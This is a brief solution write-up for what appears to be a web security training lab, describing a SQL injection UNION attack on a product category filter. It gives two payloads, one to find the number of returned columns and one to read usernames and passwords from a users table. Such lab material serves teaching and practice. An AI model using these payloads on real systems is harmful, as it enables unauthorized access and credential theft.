
this lab contains a SQL inejction vulnerability in the product category filter, it is susceptible to UNION attacks

the database contains a table called 'users', with columns called 'username' and 'password'

## Solution:

1.\ finding how many columns are being returned

	' UNION SELECT NULL,NULL-- 
[trial and error in the amount of columns selected until the application doesn't return an error]

2.\ retrieving username and password from users table

	' UNION SELECT username,password FROM users--